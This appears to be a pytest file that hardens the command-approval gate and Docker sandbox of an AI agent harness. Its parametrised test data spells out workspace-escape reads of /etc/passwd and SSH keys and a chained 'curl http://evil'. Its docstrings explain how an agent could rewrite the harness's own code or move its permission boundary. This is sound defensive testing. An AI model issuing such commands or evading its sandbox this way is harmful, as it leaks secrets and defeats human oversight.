        assert classify_command(command, _tiered).tier == SANDBOXED

    @pytest.mark.parametrize("command", QUOTED_ESCAPES)
    def test_reaching_the_host_now_costs_a_human(
            self, command, _tiered, monkeypatch):
        """With the fallback on -- the only configuration in which a
        non-inert command reaches the host at all -- the answer is ASK.
        Asserted against containment rather than against `_asks` alone,
        because with the fallback OFF the same call returns False for the
        opposite reason: nothing can run it, so there is nothing to
        approve."""
        set_posture(monkeypatch, allow_insecure_fallback=True)
        set_posture(monkeypatch, auto_approve_fallback=False)
        profile = classify_command(command, _tiered)
        assert containment_for(profile, docker_available=False) == UNCONTAINED
        assert _asks(command, docker=False) is True

    @pytest.mark.parametrize("command", QUOTED_ESCAPES)
    def test_and_with_docker_up_it_is_simply_contained(self, command, _tiered,
                                                       monkeypatch):
        """The cost of the fix, measured -- under `contained`, which holds
        the rule this was written against (§48, CE2). There a quoted
        command is still auto-approved; it just runs in the container,
        where `/etc/passwd` is the container's own. Under the shipped
        `tiered` it asks, for being non-inert rather than for being quoted
        (CE1)."""
        set_posture(monkeypatch, shell_approval_mode="contained")
        profile = classify_command(command, _tiered)
        assert containment_for(profile, docker_available=True) == CONTAINED
        assert _asks(command, docker=True) is False

    def test_a_legitimate_quoted_workspace_path_still_works(self, _tiered,
                                                            monkeypatch):
        """The friction this fix costs someone: none, under Docker in
        `contained`. A workspace file whose name has a space in it is
        SANDBOXED rather than INERT, and runs without a prompt there. Under
        `tiered` it asks (§48, CE1) -- the price of refusing to tell a
        quoted filename from a quoted program, which is G2's price."""
        set_posture(monkeypatch, shell_approval_mode="contained")
        assert _asks('cat "my notes.txt"', docker=True) is False
        set_posture(monkeypatch, shell_approval_mode="tiered")
        assert _asks('cat "my notes.txt"', docker=True) is True

    def test_the_classifier_and_the_executor_agree_on_every_token(
            self, _tiered):
        """The invariant the fix restores, stated once and over a corpus
        rather than over the three spellings that happened to be found.

        Anything the classifier is willing to call INERT must still be
        inside the workspace AFTER the executor has done its own
        tokenisation. `posix=True` deliberately, on every platform: it is
        what `_run_inert` uses on Linux and macOS, and it is the stricter
        of the two, so the property holds everywhere rather than only
        where the test happens to run.
        """
        corpus = self.QUOTED_ESCAPES + [
            'cat notes.txt', 'ls -la', 'grep -r pattern .',
            'cat "my notes.txt"', 'wc -l "../secret"',
            'head -n 5 notes.txt', 'cat --file="/etc/x"',
            'diff "a b.txt" "../../c.txt"',
        ]
        for command in corpus:
            if classify_command(command, _tiered).tier != INERT:
                continue
            try:
                argv = shlex.split(command, posix=True)
            except ValueError:  # unbalanced quotes -- never inert anyway
                pytest.fail("%r was classified INERT but does not tokenise"
                            % command)
            for token in argv[1:]:
                assert _within(_tiered, token), (command, token)


class TestTheWorkspaceCannotBeTheHarness:
    """`_run_docker` binds the workspace read-write at /workspace, and a
    SANDBOXED command under CONTAINED with no network is AUTO-APPROVED --
    so a workspace overlapping the harness's own tree was unattended
    write access to the code about to be executed next, and a workspace
    at a home directory was the same for `~/.config/venastine/`, where
    trusted_projects.json (the D17 gate) and mcp.json (which names the
    commands the harness spawns) live."""

    def test_the_default_layout_is_allowed(self):
        root = protected_paths.harness_root()
        assert protected_paths.check_workspace(
            os.path.join(root, "workspace")) is None
        assert protected_paths.check_workspace(
            os.path.join(root, "output")) is None
        assert protected_paths.check_workspace(
            os.path.join(root, "workspace", "nested")) is None

    def test_the_install_tree_itself_is_refused(self):
        reason = protected_paths.check_workspace(
            protected_paths.harness_root())
        assert reason is not None
        assert "install tree" in reason
        assert "./workspace" in reason   # says what to do instead

    @pytest.mark.parametrize("name", ["core", "security", "tools", "tests"])
    def test_a_source_directory_inside_it_is_refused(self, name):
        """The case a blanket "inside the install tree is fine" rule would
        have allowed, which is the original escalation with an extra
        path component."""
        assert protected_paths.check_workspace(
            os.path.join(protected_paths.harness_root(), name)) is not None

    def test_the_allowlist_fails_closed(self):
        """A directory added to the install tree in a later batch is
        protected the day it lands. A denylist of known source
        directories would leave it mounted read-write until somebody
        remembered to extend the list."""
        assert protected_paths.check_workspace(os.path.join(
            protected_paths.harness_root(), "a_module_added_next_year"
        )) is not None

    def test_the_user_config_directory_is_refused(self):
        reason = protected_paths.check_workspace(
            protected_paths.user_config_dir())
        assert reason is not None
        assert "user config directory" in reason

    def test_an_unrelated_project_is_allowed(self, tmp_path):
        assert protected_paths.check_workspace(str(tmp_path)) is None

    def test_a_sibling_sharing_a_prefix_is_not_inside(self):
        """`<harness>-evil` must not read as inside `<harness>`, which is
        what a bare startswith would say. test_file_ops.py:314 records the
        same bug in `_is_within_workspace`, where it survived 1406 tests --
        this is the over-refusal direction of it, and it would make a
        legitimate sibling directory unusable as a workspace."""
        assert protected_paths.check_workspace(
            protected_paths.harness_root() + "-evil") is None
        assert protected_paths.check_workspace(
            protected_paths.user_config_dir() + "-backup") is None

    def test_a_separate_clone_of_the_harness_is_allowed(self, tmp_path):
        """The guard names the RUNNING install, not every copy of the
        source. An npm-installed harness pointed at a development clone
        sees two disjoint trees and allows it: writing to a clone you are
        not executing cannot escalate the privileges of the process doing
        the writing."""
        clone = tmp_path / "venastine-dev"
        (clone / "security").mkdir(parents=True)
        (clone / "main.py").write_text("# a clone, not the running install")
        assert protected_paths.check_workspace(str(clone)) is None

    def test_a_sensitive_path_never_refuses_a_workspace(self, monkeypatch):
        """The two-class split. AGENT_LOG_FILE can legitimately point
        into $HOME, and letting that refuse a $HOME workspace would turn
        a logging preference into a launch failure."""
        home = os.path.realpath(os.path.expanduser("~"))
        monkeypatch.setattr(protected_paths, "harness_root",
                            lambda: os.path.realpath("/nowhere/harness"))
        monkeypatch.setattr(protected_paths, "user_config_dir",
                            lambda: os.path.realpath("/nowhere/config"))
        monkeypatch.setenv("AGENT_LOG_FILE", os.path.join(home, "app.log"))
        assert protected_paths.check_workspace(home) is None


class TestTheHarnessTreesAreBoundReadOnly:
    """The other half: when a protected path is NESTED inside the
    workspace there is nothing to refuse, so it is bound read-only at its
    place in the container -- Docker resolves overlapping binds by mount
    depth, which is what `_venastine_readonly_mount` already relies on."""

    @pytest.fixture
    def _ws(self, tmp_path, monkeypatch):
        """A workspace with a fake user config dir nested inside it, and
        the real protected paths pointed somewhere harmless."""
        ws = tmp_path / "ws"
        (ws / ".config" / "venastine").mkdir(parents=True)
        monkeypatch.setattr(protected_paths, "harness_root",
                            lambda: os.path.realpath(str(tmp_path / "away")))
        monkeypatch.setattr(
            protected_paths, "user_config_dir",
            lambda: os.path.realpath(str(ws / ".config" / "venastine")))
        monkeypatch.setattr(protected_paths, "sensitive_paths", lambda: [])
        return os.path.realpath(str(ws))

    def test_a_nested_protected_path_becomes_a_readonly_bind(self, _ws):
        args = protected_paths.readonly_mounts(_ws)
        assert args[0] == "-v"
        assert args[1].endswith(":/workspace/.config/venastine:ro")

    def test_a_missing_protected_path_mounts_nothing(
            self, tmp_path, monkeypatch):
        """Docker CREATES a missing bind source, as a root-owned
        directory on the HOST -- so an unconditional mount would conjure
        a `.config/venastine/` into the user's tree, or an `app.db` that
        is a DIRECTORY where the harness expects a SQLite file. Same trap
        `_venastine_readonly_mount`'s isdir guard exists for."""
        ws = tmp_path / "ws"
        ws.mkdir()
        monkeypatch.setattr(protected_paths, "harness_root",
                            lambda: os.path.realpath(str(tmp_path / "away")))
        monkeypatch.setattr(
            protected_paths, "user_config_dir",
            lambda: os.path.realpath(str(ws / ".config" / "venastine")))
        monkeypatch.setattr(protected_paths, "sensitive_paths", lambda: [])
        assert protected_paths.readonly_mounts(
            os.path.realpath(str(ws))) == []

    def test_nested_protected_paths_collapse_to_the_outermost(
            self, tmp_path, monkeypatch):
        """On a global install the database and the log directory both
        live under `~/.config/venastine`. A second read-only bind
        underneath a read-only one buys nothing."""
        ws = tmp_path / "ws"
        cfg = ws / ".config" / "venastine"
        cfg.mkdir(parents=True)
        (cfg / "logs").mkdir()
        monkeypatch.setattr(protected_paths, "harness_root",
                            lambda: os.path.realpath(str(tmp_path / "away")))
        monkeypatch.setattr(protected_paths, "user_config_dir",
                            lambda: os.path.realpath(str(cfg)))
        monkeypatch.setattr(
            protected_paths, "sensitive_paths",
            lambda: [(os.path.realpath(str(cfg / "logs")), "the log dir")])
        args = protected_paths.readonly_mounts(os.path.realpath(str(ws)))
        assert args.count("-v") == 1
        assert args[1].endswith(":/workspace/.config/venastine:ro")

    def test_the_docker_command_carries_them(self, _ws):
        """Wiring, not logic: the mounts have to reach `docker run`."""
        with patch("subprocess.Popen") as popen:
            popen.return_value.communicate.return_value = ("", "")
            popen.return_value.returncode = 0
            _run_docker("echo hi", _ws, "/bin/bash")
        argv = popen.call_args[0][0]
        assert any(a.endswith(":/workspace/.config/venastine:ro")
                   for a in argv)


class TestEveryBackendRefusesARefusedWorkspace:
    """One check at the top of run_sandboxed rather than one inside
    `_run_docker`, so the inert path and the subprocess fallback -- which
    mount nothing and would otherwise be exempt by accident -- refuse it
    too."""

    @pytest.mark.parametrize("command", ["cat notes.txt", "python x.py"])
    def test_no_backend_will_run_it(self, command):
        with pytest.raises(SandboxUnavailable, match="AGENT_WORKSPACE"):
            run_sandboxed(command, protected_paths.harness_root())

    def test_the_fallback_refuses_it_too(self, monkeypatch):
        set_posture(monkeypatch, allow_insecure_fallback=True)
        with pytest.raises(SandboxUnavailable, match="AGENT_WORKSPACE"):
            run_sandboxed("python evil.py",
                          protected_paths.harness_root(),
                          docker_available=False)

    def test_a_refused_workspace_is_not_created(self):
        """The check sits ABOVE audit #50's makedirs on purpose: creating
        the directory is already the wrong move, and a refusal that first
        conjures a directory into the harness's own tree is not a refusal.

        Asserted against the CALL rather than against the filesystem, and
        that is not a style choice. The filesystem version passes or fails
        on what an earlier run left behind: while this batch's mutation
        testing was running, the mutation that removes the refusal let
        makedirs through, and the real directory it created then failed
        this test under every LATER mutation -- five kills that were
        actually one, scored against tests that had nothing to do with it.
        A test that writes into the tree it is defending cannot be run
        twice."""
        ghost = os.path.join(protected_paths.harness_root(),
                             "ghost_workspace_dir")
        with patch("security.sandbox.os.makedirs") as makedirs:
            with pytest.raises(SandboxUnavailable, match="AGENT_WORKSPACE"):
                run_sandboxed("cat notes.txt", ghost)
        makedirs.assert_not_called()
        assert not os.path.exists(ghost)


class TestTheMirroredResolversMatchTheirOwners:
    """protected_paths re-derives three paths their real owners also
    derive, rather than importing them: logging_setup pulls in
    safety.policy_enforcement, and importing it would be the first
    `security/ -> safety/` edge in the project. Duplication is only safe
    while it stays true, so this is a test and not a comment."""

    def test_the_user_config_directory_matches_config_loader(self):
        from core import config_loader
        assert (os.path.realpath(config_loader._user_config_dir())
                == protected_paths.user_config_dir())

    def test_the_log_directory_matches_logging_setup(self, monkeypatch):
        """The same DEFAULT. The two orderings were measured and are not
        worth a second assertion.

        This applies protected_paths' ordering (`realpath(dirname(x))`) to
        logging_setup's constant, so it pins the shared default and not how
        each side turns a path into a directory -- and configure_logging
        does normalize in the other order (`dirname(abspath(x))`). A
        spelling loop over `logs/app.log`, `app.log`, `logs/../app.log`,
        `./logs/app.log`, `logs/./app.log`, `a/b/../app.log` and an
        absolute path was written to close that, then mutation-checked: on
        Windows and under WSL the two orderings agree on every one, and
        three plausible re-orderings of `_log_dir` left the loop GREEN. It
        was removed rather than kept, because a block that cannot fail
        reads as coverage this file does not have.

        ONE REAL ASYMMETRY, and it is deliberate. Through a SYMLINKED log
        directory `abspath` keeps the link path and `realpath` follows it,
        so the owner says `<cwd>/linked` and the mirror says `<cwd>/real`.
        The mirror is the correct one here -- it names the directory a bind
        mount has to target, and the handler writing through the link
        reaches the same real file. Do not "fix" it by dropping realpath.
        """
        import logging_setup
        monkeypatch.delenv("AGENT_LOG_FILE", raising=False)
        assert (os.path.realpath(
            os.path.dirname(logging_setup._DEFAULT_LOG_FILE))
            == protected_paths._log_dir())

    def test_the_log_directory_follows_the_env_override(self, monkeypatch):
        monkeypatch.setenv("AGENT_LOG_FILE", os.path.join("var", "x.log"))
        assert protected_paths._log_dir() == os.path.realpath("var")

    def test_the_providers_file_matches_credentials(self):
        import credentials
        paths = [p for p, _ in protected_paths.sensitive_paths()]
        assert os.path.realpath(credentials.LLM_PROVIDERS_FILE) in paths

    def test_the_database_matches_config(self):
        paths = [p for p, _ in protected_paths.sensitive_paths()]
        assert os.path.realpath(config.DB_PATH) in paths


class TestTheWorkspaceBoundaryIsNotEnvironmentControlled:
    """The audit that produced this batch asked whether a compromised
    agent could `export AGENT_WORKSPACE` and move the permission
    boundary. It cannot: config binds the value once at import, and a
    child shell's export dies with the subprocess that ran it.

    Pinned because the fix someone would reach for -- "resolve it at call
    time so tests can redirect it", which is genuinely the right posture
    for the trust store and for tui/preferences.py -- would make the
    answer yes for a value that is a PERMISSION BOUNDARY rather than a
    storage location."""

    def test_mutating_the_environment_does_not_move_the_workspace(
            self, monkeypatch):
        before = config.WORKSPACE_DIR
        monkeypatch.setenv("AGENT_WORKSPACE", os.path.join("somewhere",
                                                           "else"))
        assert config.WORKSPACE_DIR == before

    def test_file_ops_root_is_bound_at_import_too(self, monkeypatch):
        from tools.builtin import file_ops
        before = file_ops.WORKSPACE_ROOT
        monkeypatch.setenv("AGENT_WORKSPACE", os.path.join("somewhere",
                                                           "else"))
        assert file_ops.WORKSPACE_ROOT == before


# ===========================================================================
# ---- Batch 39: escaping, and the first word of a compound command ---------
# ===========================================================================


class TestBackslashCannotHideAnEscape:
    """Q1. Batch 37 closed the same hole for quotes and left one character
    open.

    `_escapes_workspace` reads raw `.split()` tokens; `_run_inert` execs
    `shlex.split()` tokens, and in POSIX mode shlex consumes the backslash
    exactly as it consumes quotes. So `cat \\/etc\\/passwd` was ONE token
    that joined onto the workspace root and read as inside it -- classified
    INERT, silently auto-approved, no prompt -- and then ran on the host as
    `['cat', '/etc/passwd']`. Measured on a real POSIX host before the fix:
    return code 0, and the contents of /etc/passwd came back.

    `.\\.\\/etc/passwd` is in the corpus because it is the case the
    leading-backslash spellings hide: it escapes by TRAVERSAL, so a guard
    that only caught absolute paths after unescaping would miss it, and it
    is the spelling that classifies INERT on Windows too.
    """

    BACKSLASH_ESCAPES = [
        "cat " + BS + "/etc" + BS + "/passwd",
        "cat " + BS + "/etc/passwd",
        "cat ." + BS + "." + BS + "/etc/passwd",
        "grep -r x --file=" + BS + "/etc/passwd",
        "stat " + BS + "/root/.ssh/id_rsa",
    ]

    @pytest.mark.parametrize("command", BACKSLASH_ESCAPES)
    def test_an_escaped_escape_is_no_longer_inert(self, command, _tiered):
        assert _is_inert(command) is False
        assert classify_command(command, _tiered).tier == SANDBOXED

    @pytest.mark.parametrize("command", BACKSLASH_ESCAPES)
    def test_reaching_the_host_now_costs_a_human(
            self, command, _tiered, monkeypatch):
        """With the fallback on -- the only configuration in which a
        non-inert command reaches the host at all -- the answer is ASK.
        Asserted against containment rather than against `_asks` alone,
        because with the fallback OFF the same call returns False for the
        opposite reason: nothing can run it, so there is nothing to
        approve."""
        set_posture(monkeypatch, allow_insecure_fallback=True)
        set_posture(monkeypatch, auto_approve_fallback=False)
        profile = classify_command(command, _tiered)
        assert containment_for(profile, docker_available=False) == UNCONTAINED
        assert _asks(command, docker=False) is True

    @pytest.mark.parametrize("command", BACKSLASH_ESCAPES)
    def test_and_with_docker_up_it_is_simply_contained(self, command, _tiered,
                                                       monkeypatch):
        """The cost of the fix, measured -- under `contained`, which holds
        the rule this was written against (§48, CE2). There an escaped
        command is still auto-approved; it just runs in the container,
        where /etc/passwd is the container's own. Under the shipped
        `tiered` it asks, for being non-inert (CE1)."""
        set_posture(monkeypatch, shell_approval_mode="contained")
        profile = classify_command(command, _tiered)
        assert containment_for(profile, docker_available=True) == CONTAINED
        assert _asks(command, docker=True) is False

    def test_a_legitimate_escaped_workspace_path_still_works(self, _tiered,
                                                             monkeypatch):
        """The friction this fix costs someone on POSIX: none, under Docker
        in `contained`. A workspace file whose name has a space in it is
        SANDBOXED rather than INERT, and runs without a prompt there. Under
        `tiered` it asks (§48, CE1)."""
        set_posture(monkeypatch, shell_approval_mode="contained")
        assert _asks("cat notes" + BS + " file.txt", docker=True) is False
        set_posture(monkeypatch, shell_approval_mode="tiered")
        assert _asks("cat notes" + BS + " file.txt", docker=True) is True

    def test_the_windows_spelling_is_the_priced_regression(self, _tiered):
        """Stated as a test so the cost cannot be forgotten and then
        rediscovered as a bug. `cat sub\\dir\\notes.txt` runs on the inert
        path today on Windows and now goes to Docker, where `bash -c`
        strips the backslashes and it fails. Forward slashes work on
        Windows for every INERT_COMMANDS binary; the failure is loud."""
        command = "cat sub" + BS + "dir" + BS + "notes.txt"
        assert _is_inert(command) is False
        assert classify_command(command, _tiered).tier == SANDBOXED
        assert _is_inert("cat sub/dir/notes.txt") is True


class TestTheTwoTokenisersCannotDisagree:
    """The property that makes Q1 a closure rather than the next patch in a
    series, and the one that would have caught it a batch earlier.

    shlex in POSIX mode consumes exactly four things: whitespace, `'`, `"`
    and `\\`. Whitespace splits both tokenisers identically. The other
    three are all rejected by `_SHELL_METACHARACTERS`. So for any command
    the classifier is willing to look at as raw tokens, the raw tokens ARE
    the tokens the executor will run -- no enumeration of spellings
    required, and no character left to find next batch.
    """

    ALPHABET = (list("abc-./=") + [" ", "\t", "\n", BS, "'", '"']
                + list(";|&$><(){}!#~") + ["`"])

    def _samples(self, count):
        """Deterministic, so a failure is reproducible from the seed alone
        rather than being a flake someone reruns until it passes."""
        rng = random.Random(20260829)
        for _ in range(count):
            length = rng.randint(1, 14)
            yield "".join(rng.choice(self.ALPHABET) for _ in range(length))

    def _commands(self, count):
        """Samples with a REAL inert command in front.

        Uniformly random strings are the right corpus for the tokeniser
        property and the wrong one for the classifier property: their first
        word is essentially never in INERT_COMMANDS, so every sample
        classifies SANDBOXED and the test measures nothing. The assertion
        on `seen_inert` below is what caught that, and it stays for the
        same reason -- a corpus that stops reaching the tier it is about
        must fail rather than pass vacuously.
        """
        rng = random.Random(20260829)
        for _ in range(count):
            args = "".join(rng.choice(self.ALPHABET)
                           for _ in range(rng.randint(1, 14)))
            yield "%s %s" % (rng.choice(config.INERT_COMMANDS), args)

    def test_nothing_the_class_accepts_tokenises_two_ways(self):
        """The closure, stated directly. Before the fix this found 870
        divergent survivors in 300k samples and every one of them was a
        backslash."""
        for sample in self._samples(20000):
            if not sample.strip():
                continue
            if _SHELL_METACHARACTERS.search(sample):
                continue
            try:
                argv = shlex.split(sample, posix=True)
            except ValueError:  # unbalanced quotes: rejected above anyway
                pytest.fail("%r survived the class but does not tokenise"
                            % sample)
            assert sample.split() == argv, (
                "the classifier reads %r and the executor runs %r -- one of "
                "them is wrong about this command" % (sample.split(), argv))

    def test_and_so_nothing_classified_inert_escapes_after_tokenising(
            self, _tiered):
        """The same property read through the gate rather than through the
        tokenisers, which is the form that names the consequence: anything
        auto-approved as INERT is still inside the workspace AFTER the
        executor has finished with it.

        `posix=True` deliberately, on every platform -- it is what
        `_run_inert` uses on Linux and macOS, and it is the stricter of the
        two, so the property holds everywhere rather than only where the
        test happens to run. Batch 37 wrote that line and an enumerated
        corpus underneath it; this is the generative half it was missing.

        5000 samples rather than the sibling test's 20000: this one
        resolves real paths, so it costs ~5s against that test's 0.2s, and
        the count is set where the INERT yield stops climbing fast enough
        to pay for the seconds.
        """
        seen_inert = 0
        for sample in self._commands(5000):
            if classify_command(sample, _tiered).tier != INERT:
                continue
            seen_inert += 1
            argv = shlex.split(sample, posix=True)
            for token in argv[1:]:
                assert _within(_tiered, token), (sample, token)
        assert seen_inert > 100, (
            "the corpus produced %d INERT samples, too few to be testing "
            "anything -- the alphabet or INERT_COMMANDS changed"
            % seen_inert)


class TestChainingCannotHideBehindTheFirstWord:
    """Q2, at the level the flag is actually consumed.

    NOT an escalation, and the record says so in both places: `network` is
    one fact with two consumers, so the flag withheld from `echo hi &&
    curl x` is the flag `_run_docker` reads, and the compound line ran
    under `--network none`. What was wrong is that the profile asserted "no
    network" about a call that plainly wanted it, and `auto_approved`
    skipped the human on that basis.
    """

    def test_a_benign_first_word_no_longer_buys_an_auto_approval(
            self, _tiered):
        profile = classify_command("echo hi && curl http://evil", _tiered)
        assert profile.tier == SANDBOXED_NET
        assert profile.network is True
        assert _asks("echo hi && curl http://evil", docker=True) is True

    def test_and_the_user_can_now_say_yes_to_one_that_needs_it(self, _tiered):
        """The half of Q2 that is a usability fix rather than a tightening.
        These have no egress today AND are never asked about, so there is
        no way for a user to allow them -- the command just fails inside a
        network-less container for a reason nothing reports."""
        for command in ["cd proj && pip install -e .",
                        "python -m pip install requests",
                        "git clone http://x && cd x"]:
            assert classify_command(command, _tiered).network is True

    def test_an_inert_command_is_unchanged(self, _tiered):
        """The carve-out, pinned so a later simplification cannot delete it
        as redundant. Deleting it makes `grep pip notes.txt` prompt."""
        for command in ["grep pip notes.txt", "grep git notes.txt",
                        "cat curl", "echo git"]:
            profile = classify_command(command, _tiered)
            assert profile.tier == INERT
            assert profile.network is False
            assert _asks(command, docker=True) is False

    def test_what_made_the_old_rule_safe_is_still_true(self, _tiered):
        """Verified-safe, recorded rather than dropped. The reason the
        first-word rule could not escalate is that ONE value drives both
        the gate and `--network`, so under-granting reaches the executor
        too. Q2 changed which commands get the flag; it did not split the
        flag in two, and splitting it is the #67/#133 shape this module
        exists to avoid."""
        profile = classify_command("echo hi && curl http://evil", _tiered)
        with patch("security.sandbox.subprocess.Popen") as popen:
            popen.return_value.communicate.return_value = ("", "")
            popen.return_value.returncode = 0
            _run_docker("echo hi && curl http://evil", _tiered,
                        "bash", network=profile.network)
        argv = popen.call_args[0][0]
        assert profile.network is True
        assert "none" not in argv, (
            "the profile granted network, so the container must get it")

    def test_and_when_it_is_withheld_the_whole_line_is_covered(self, _tiered):
        """The other direction: no grant means `--network none`, which
        applies to the compound line and not merely to its first word."""
        profile = classify_command("echo hi && ls", _tiered)
        assert profile.network is False
        with patch("security.sandbox.subprocess.Popen") as popen:
            popen.return_value.communicate.return_value = ("", "")
            popen.return_value.returncode = 0
            _run_docker("echo hi && ls", _tiered, "bash",
                        network=profile.network)
        argv = popen.call_args[0][0]
        assert argv[argv.index("--network") + 1] == "none"


class TestTheGateAnswersForEveryString:
    """Q3. `classify_command` guards against a non-string command because
    it is handed the model's tool-call input verbatim, before ShellParams
    validates anything. The guard was one layer too shallow: a token that
    IS a string but is not a resolvable PATH made `os.path.realpath` raise
    out of `_within`, out of `_escapes_workspace`, out of
    `classify_command`, and out of `registry.approval_needed()` -- which
    has no handler, and neither does anything above it.

    Found by the generative corpus rather than by review, and then
    MIS-TESTED, which is the more useful half of the story. The first
    version asserted the fail-closed answer using two tokens observed on
    Windows, and CI on Linux disagreed with both:

        token         Windows                      Linux
        ------------  ---------------------------  ------------------------
        `\\\\;`         OSError -- the guard fires   an ordinary relative
                                                   filename, resolves
                                                   INSIDE the workspace
        `a\\0b`         resolves fine                ValueError -- the guard
                                                   fires
        `\\\\?`         no raise; escapes as         resolves inside
                      UNC-absolute

    Two lessons, both pinned below. `\\\\?` never raises anywhere -- it
    returned False on Windows because it is UNC-absolute and therefore
    outside the workspace, an ORDINARY ESCAPE rather than the guard
    firing, so that case passed for a reason unrelated to its own name.
    And a backslash is a path separator on exactly one of the two
    platforms, so no single token exercises this guard on both.

    So the CONTRACT is pinned platform-neutrally by making `realpath`
    raise, and the real triggers are asserted where each actually fires.
    """

    # Every one of these must be ANSWERED rather than raised on, on both
    # platforms. The NUL token is the Linux trigger and is reachable: a
    # JSON tool-call argument can carry a \\u0000 escape.
    MALFORMED = [
        BS * 2 + ";",
        BS * 2 + "|x",
        "cat " + BS * 2 + ";",
        "ls " + BS * 2 + ";" + BS + "share",
        "cat a" + chr(0) + "b",
        "grep -r x --file=a" + chr(0) + "b",
    ]

    def test_a_token_that_cannot_be_resolved_reads_as_outside(
            self, _tiered, monkeypatch):
        """THE contract, stated without reference to any platform: if
        resolution fails, the answer is 'outside'.

        Fail CLOSED. False here means the argument escapes, which means
        the command is asked about -- never that it is denied silently.
        Asserted by making `realpath` raise rather than by finding a token
        that makes it raise, because which tokens do that is a property of
        the OS and not of this guard.
        """
        def boom(_path):
            raise OSError(668, "An assertion failure has occurred")

        monkeypatch.setattr(os.path, "realpath", boom)
        assert _within(_tiered, "notes.txt") is False

    def test_and_a_ValueError_is_caught_too(self, _tiered, monkeypatch):
        """The other half of `except (OSError, ValueError)`. It was
        written on instinct with no trigger behind it; the NUL token below
        is the trigger, and this pins the clause independently of whether
        the platform running the suite has one."""
        def boom(_path):
            raise ValueError("embedded null byte")

        monkeypatch.setattr(os.path, "realpath", boom)
        assert _within(_tiered, "notes.txt") is False

    @pytest.mark.skipif(platform.system() != "Windows",
                        reason="a backslash is only a path separator on "
                               "Windows; on POSIX this token is an "
                               "ordinary relative filename that resolves")
    def test_the_windows_trigger_is_a_malformed_unc_path(self, _tiered):
        """`\\\\;` -- `ntpath.realpath` raises WinError 668 on it."""
        assert _within(_tiered, BS * 2 + ";") is False

    @pytest.mark.skipif(platform.system() == "Windows",
                        reason="Windows resolves a NUL-bearing path "
                               "without complaint; POSIX raises")
    def test_the_posix_trigger_is_an_embedded_nul(self, _tiered):
        """`a\\0b` -- `posixpath.realpath` raises ValueError on it, and a
        JSON tool argument can carry one."""
        assert _within(_tiered, "a" + chr(0) + "b") is False

    @pytest.mark.parametrize("command", MALFORMED)
    def test_the_classifier_answers_instead_of_raising(
            self, command, _tiered):
        profile = classify_command(command, _tiered)
        assert profile.tier in (INERT, HOST_READ, SANDBOXED,
                                SANDBOXED_NET, UNKNOWN)

    @pytest.mark.parametrize("command", MALFORMED)
    def test_and_so_does_the_approval_gate(self, command, _tiered):
        """The reachable failure, at the layer it was reachable from:
        before Q3 this raised out of `registry.approval_needed()`, which
        has no handler above it.

        The assertion is deliberately only that a bool comes back. WHICH
        bool is platform-dependent -- `\\\\;` escapes on Windows and is
        inside the workspace on POSIX -- and pinning it either way would
        re-make the mistake this class exists to record. `isinstance`
        rather than `in (True, False)`, which reads like an assertion
        while being vacuously true.
        """
        assert isinstance(_asks(command, docker=True), bool)

    def test_a_resolvable_token_is_unaffected(self, _tiered):
        """The except must not swallow the normal answer -- a bare
        `except` here would make every token read as escaping and turn the
        whole inert tier into a prompt."""
        assert _within(_tiered, "notes.txt") is True
        assert _within(_tiered, os.path.join("sub", "notes.txt")) is True
        assert _within(_tiered, os.path.join("..", "escape.txt")) is False
        assert classify_command("cat notes.txt", _tiered).tier == INERT


# ===========================================================================
# ---- Protected segments: a command naming `.venastine/` always asks -------
# ===========================================================================

class TestProtectedSegmentsAlwaysAsk:
    """security/protected_paths.PROTECTED_SEGMENTS, read from the shell
    side: a command whose tokens name `.venastine/` always requires
    approval under tiered mode, whatever the sandbox classifies it as.

    The file tools DENY such a path outright (test_file_ops.py); the
    shell ASKS, because a command is free text and the token check
    refuses to parse it (G2) -- what slips past a token check still
    lands in front of a human with the full command text. The
    auto-approved INERT tier executes argv with NO shell (EP5), so its
    tokens ARE its arguments and the check is sound exactly there.
    """

    def test_an_inert_read_of_venastine_is_asked_about(self, _tiered):
        assert _asks("ls .venastine") is True
        assert _asks("cat .venastine/settings.json") is True

    def test_a_nested_and_a_traversal_reference_are_caught(self, _tiered):
        assert _asks("cat deep/nested/.venastine/mcp.json") is True
        assert _asks("cat sub/../.venastine/settings.json") is True

    def test_a_flag_assigned_reference_is_caught(self, _tiered):
        # The text check reads components of the RAW token, so a value
        # glued to a flag is caught the way --file=/etc/x is (hole 1).
        assert _asks("grep --path=.venastine/settings.json x") is True

    def test_an_untouched_command_is_unaffected(self, _tiered):
        assert _asks("cat notes.txt") is False
        assert _asks("ls -la") is False

    def test_the_routing_is_unchanged_it_still_classifies_inert(self, _tiered):
        """EP6: approval and execution are one decision written twice --
        but this control is approval-side ONLY. When approved, the
        command still runs contained, where the read-only bind of
        `.venastine/` (§28 G6) is the write backstop."""
        profile = classify_command("cat .venastine/settings.json", _tiered)
        assert profile.tier == INERT
        assert containment_for(profile, docker_available=True) == CONTAINED

    def test_the_fallback_opt_in_no_longer_covers_a_protected_write(
            self, monkeypatch, tmp_path):
        """A write is a non-inert tier; with Docker down and the insecure
        fallback opted into, it auto-approved before this check existed.
        One opt-in must not answer for the directory the ro-mount exists
        to keep commands out of."""
        set_posture(monkeypatch, shell_approval_mode="tiered",
                    allow_insecure_fallback=True, auto_approve_fallback=True)
        monkeypatch.setattr(config, "WORKSPACE_DIR", str(tmp_path))
        assert _asks("touch .venastine/notes.txt", docker=False) is True
        # The control: the same opt-in still covers an ordinary write.
        assert _asks("touch notes.txt", docker=False) is False

    def test_mode_never_still_answers_outright(self, monkeypatch, tmp_path):
        """The documented bypass, pinned rather than hidden: mode "never"
        is an opt-out of ALL approval and already auto-approves a host
        read of /etc/shadow. G3: the mode is the gate."""
        set_posture(monkeypatch, shell_approval_mode="never")
        monkeypatch.setattr(config, "WORKSPACE_DIR", str(tmp_path))
        assert _asks("cat .venastine/settings.json") is False

    def test_the_notice_says_why_an_inert_command_is_prompting(self, _tiered):
        notice = _shell_approval_notice(
            {"command": "cat .venastine/settings.json"})
        assert ".venastine" in notice
        plain = _shell_approval_notice({"command": "cat notes.txt"})
        assert ".venastine" not in plain
